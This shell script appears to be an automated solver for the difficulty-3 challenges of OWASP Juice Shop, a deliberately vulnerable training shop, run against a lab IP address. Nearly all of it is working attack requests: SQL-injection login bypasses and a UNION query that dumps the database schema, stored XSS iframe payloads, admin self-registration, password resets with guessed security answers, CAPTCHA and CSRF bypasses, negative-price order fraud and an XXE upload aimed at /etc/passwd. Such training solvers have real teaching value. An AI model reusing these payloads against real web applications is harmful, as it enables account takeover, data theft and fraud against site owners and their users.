#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.87.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "3.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/3-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/3-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/3-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/3-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/3-cookies.txt

# Register as a user with administrator privileges.
echo "3.1 - API-ONLY XSS"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/3-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/3-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/3-admin-cookies.txt
curl -s -X PUT "http://$target_ip/api/Products/1" -b "$result_folder/3-admin-cookies.txt" -L -H "Content-Type: application/json" -d "{\"description\":\"<iframe src=\\\"javascript:alert(\`xss\`)\\\">\"}" -o /dev/null

# Register as a user with administrator privileges.
echo "3.2 - ADMIN REGISTRATION"
curl -s -X POST "http://$target_ip/api/Users" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"test@juice-sh.op\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":2,\"question\":\"Mother's maiden name?\",\"createdAt\":\"2024-13-10T01:58:31.043Z\",\"updatedAt\":\"2024-13-10T01:58:31.043Z\"},\"securityAnswer\":\"test\"}" -o $result_folder/3-register.json

# Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.
echo "3.3 - BJOERN'S FAVORITE PET"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o /dev/null

# Submit 10 or more customer feedbacks within 10 seconds.
echo "3.4 - CAPTCHA BYPASS"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/3-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/3-bjoern.json)
echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BJOERN_TOKEN" >> $result_folder/3-bjoern-cookies.txt
curl -s -X GET http://$target_ip/rest/user/whoami -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-user.json
USER_ID=$(jq -r '.user.id' $result_folder/3-user.json)
echo "--> The user id is $USER_ID"
for i in $(seq 1 12); do
    curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-captcha.json
    CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/3-captcha.json)
    CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/3-captcha.json)
    echo "--> Sending feedback with captcha $CAPTCHA_ID which result is $CAPTCHA_RESULT"
    curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/3-bjoern-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${BJOERN_TOKEN}"  -d "{\"UserId\":$USER_ID,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}" -o /dev/null
done

# Change the name of a user by performing Cross-Site Request Forgery from another origin.
echo "3.5 - CSRF"
curl -s -X POST http://$target_ip/profile -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://htmledit.squarefree.com" -H "Referer: http://htmledit.squarefree.com/" -L -d "username=mwahaha" 

# Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism. (This challenge is potentially harmful on Docker!)
echo "3.6 - CLIENT-SIDE XSS PROTECTION"
curl -s -X POST "http://$target_ip/api/Users/" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"<iframe src=\\\"javascript:alert(\`xss\`)\\\">\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"securityQuestion\":{\"id\":2,\"question\":\"Mother's maiden name?\",\"createdAt\":\"2024-12-13T19:31:16.275Z\",\"updatedAt\":\"2024-12-13T19:31:16.275Z\"},\"securityAnswer\":\"test\"}" -o /dev/null

# Exfiltrate the entire DB schema definition via SQL Injection.
echo "3.7 - DATABASE SCHEMA"
curl -s -X GET "http://$target_ip/rest/products/search?q=c%'))+UNION+SELECT+*,+NULL+AS+col1,+NULL+AS+col2,+NULL+AS+col3,+NULL+AS+col4+from+sqlite_master--" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /tmp/3-schema.json
jq '[.data[] | select(.id == "table")]' /tmp/3-schema.json > $result_folder/3-schema.json

# Obtain a Deluxe Membership without paying for it.
echo "3.8 - DELUXE FRAUD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"morty@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/3-morty.json
MORTY_TOKEN=$(jq -r '.authentication.token' $result_folder/3-morty.json)
echo "--> Authenticated as morty with token $(echo "$MORTY_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-morty-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$MORTY_TOKEN" >> $result_folder/3-morty-cookies.txt
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership" $result_folder/3-morty-cookies.txt > $result_folder/3-deluxe.html 2> /dev/null
curl -s -X POST http://$target_ip/rest/deluxe-membership -b "$result_folder/3-morty-cookies.txt" -H "X-User-Email: morty@juice-sh.op'--" -H "Authorization: Bearer ${MORTY_TOKEN}" -H "Content-Type: application/json" -d "{\"paymentMode\":\"none\"}" -o $result_folder/3-deluxe.json

# Give a feedback as another user
echo "3.9 - FORGED FEEDBACK"
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/3-bjoern-cookies.txt" -L -o $result_folder/3-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/3-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/3-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/3-bjoern-cookies.txt" -L -H "Content-Type: application/json" -d "{\"UserId\":2,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}" -o /dev/null

# Post a product review as another user or edit any user's existing review.
echo "3.10 - FORGED REVIEW"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/3-bender.json
BENDER_TOKEN=$(jq -r '.authentication.token' $result_folder/3-bender.json)
echo "--> Authenticated as bender with token $(echo "$BENDER_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-bender-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BENDER_TOKEN" >> $result_folder/3-bender-cookies.txt
curl -s -X PUT "http://$target_ip/rest/products/24/reviews/" -b "$result_folder/3-bjoern-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${BENDER_TOKEN}" -d "{\"message\":\"mwahaha\",\"author\":\"jim@juice-sh.op\"}" -o /dev/null


# Log in with Chris' erased user account.
echo "3.11 - GPDR DATA EXPOSURE"
# From the authentication-details query triggered by the adminstration page, we can see that user ids starts from 1 and increase by 1 for each user. Suspicious lack 
# of user id 14. We'll gather data using SQL injection
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or id = 14--\",\"password\":\"whatever\"}" -o $result_folder/3-id.json
CHRIS_EMAIL=$(jq -r '.authentication.umail' $result_folder/3-id.json)
echo "--> Chris email is $CHRIS_EMAIL"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"$CHRIS_EMAIL'--\",\"password\":\"whatever\"}" -o /dev/null

# Log in with Amy's user account.
echo "3.12 - LOGIN AMY"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"amy@juice-sh.op\",\"password\":\"K1f.....................\"}" -o $result_folder/3-amy.json
AMY_TOKEN=$(jq -r '.authentication.token' $result_folder/3-amy.json)
echo "--> Authenticated as amy with token $(echo "$AMY_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-amy-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$AMY_TOKEN" >> $result_folder/3-amy-cookies.txt

# Log in with Bender's user account.
echo "3.13 - LOGIN BENDER"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"whatever\"}" -o $result_folder/3-bender.json

# Log in with Jim's user account. (He's a start trek fan relating himself to captain kirk)
echo "3.14 - LOGIN JIM"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/3-jim.json
JIM_TOKEN=$(jq -r '.authentication.token' $result_folder/3-jim.json)
echo "--> Authenticated as jim with token $(echo "$JIM_TOKEN" | cut -c 1-20)...."
cp $result_folder/3-cookies.txt $result_folder/3-jim-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$JIM_TOKEN" >> $result_folder/3-jim-cookies.txt
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o /dev/null
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"password\":\"test123\"}" -o $result_folder/3-jim.json

# Put an additional product into another user's shopping basket.
echo "3.15 - MANIPULATE BASKET"
curl -s -X GET "http://$target_ip/api/BasketItems/5" -b "$result_folder/3-bjoern-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${BJOERN_TOKEN}" -L -d "{\"BasketId\":3}" -o $result_folder/3-quantities.json
QUANTITY=$(jq -r '.data.quantity' $result_folder/3-quantities.json)
NEW_QUANTITY=$((QUANTITY + 1))
echo "--> Product count goes from $QUANTITY to $NEW_QUANTITY"
curl -s -X PUT "http://$target_ip/api/BasketItems/5" -b "$result_folder/3-bjoern-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${BJOERN_TOKEN}" -L -d "{\"quantity\":$NEW_QUANTITY,\"BasketId\":3}" -o /dev/null
# This works and I find it frustrating that it does not trigger the flag. This does :
curl -s -X POST "http://$target_ip/api/BasketItems/" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"ProductId\":6,\"BasketId\":1,\"quantity\":1,\"BasketId\":3}" -o /dev/null

# Place an order that makes you rich.
echo "3.16 - PAYBACK TIME"
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/3-admin.json)
curl -s -X PUT "http://$target_ip/api/Products/1" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"price\":-10000}" -o /dev/null
curl -s -X POST "http://$target_ip/api/BasketItems/" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"ProductId\":1,\"BasketId\":\"$BASKET_ID\",\"quantity\":4}" -o /dev/null
curl -s -X POST "http://$target_ip/rest/basket/$BASKET_ID/checkout" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"couponData\":\"bnVsbA==\",\"orderDetails\":{\"paymentId\":\"wallet\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}}" -o /dev/null

# Prove that you actually read our privacy policy.
echo "3.17 - PRIVACY POLICY INSPECTION"
# When reading the privacy policy, some words become highlighted. Putting them together to build an url
curl -s -X GET "http://$target_ip/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility" -b "$result_folder/3-bjoern-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/3-privacy.html
HIDDEN=$(sed -n 's/.*<title>.*39;\/\(.*\)&.*/\1/p' $result_folder/3-privacy.html)
echo "--> The hidden image is $HIDDEN"
curl -s -X GET "http://$target_ip/$HIDDEN" -b "$result_folder/3-bjoern-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /dev/null

# Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.
echo "3.18 - PRODUCT TAMPERING"
curl -s -X GET "http://$target_ip/api/Products/9" -b "$result_folder/3-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/3-product.json
DESCRIPTION=$(jq '.data.description' $result_folder/3-product.json)
NEW=$(echo $DESCRIPTION | sed 's/https:\/\/www.owasp.org\/index.php\/O-Saft/https:\/\/owasp.slack.com/g')
echo "--> Description is now $NEW"
curl -s -X PUT "http://$target_ip/api/Products/9" -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"description\":$NEW}" -o /dev/null

# Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.
echo "3.19 - RESET JIM'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o $result_folder/3-jim.txt

# Upload a file larger than 100 kB..
echo "3.20 - UPLOAD SIZE"
curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-bjoern-cookies.txt" -H "Authorization: Bearer ${BJOERN_TOKEN}" -L -F "file=@$scriptpath/test2.txt;type=application/zip" -o /dev/null

# Upload a file that has no .pdf or .zip extension.
echo "3.21 - UPLOAD TYPE"
curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-bjoern-cookies.txt" -H "Authorization: Bearer ${BJOERN_TOKEN}" -L -F "file=@$scriptpath/test.txt;type=application/zip" -o /dev/null

# Retrieve the content of /etc/passwd from the server.
echo "3.22 - XXE DATA ACCESS"
curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -F "file=@$scriptpath/dangerous-invoice.xml;type=application/xml" -o $result_folder/3-etc-passwd.html

# Compute score
echo "3.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/3-cookies.txt" -L -o $result_folder/3-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 3 and .solved == true)] | length' $result_folder/3-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 3 and .solved != null)] | length' $result_folder/3-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"

